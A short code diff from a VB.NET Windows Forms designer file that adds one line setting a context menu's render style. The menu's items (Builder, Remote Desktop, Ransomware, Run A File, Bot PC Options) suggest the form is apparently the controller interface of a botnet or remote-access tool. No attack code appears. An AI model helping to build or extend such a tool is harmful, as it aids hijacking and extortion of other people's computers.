@@ -82,6 +82,7 @@ Partial Class Form1
         Me.ContextMenuStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
         Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.BuilderToolStripMenuItem, Me.ToolStripSeparator2, Me.RemoteDesktopToolStripMenuItem, Me.RansomwareToolStripMenuItem, Me.DetailsToolStripMenuItem, Me.RunAFileToolStripMenuItem, Me.ToolStripSeparator3, Me.ControllerOptionsToolStripMenuItem, Me.BotPCOptionsToolStripMenuItem, Me.BotColorToolStripMenuItem, Me.ToolStripSeparator1, Me.AboutToolStripMenuItem})
         Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
+        Me.ContextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
         Me.ContextMenuStrip1.Size = New System.Drawing.Size(222, 292)
         '
         'BuilderToolStripMenuItem
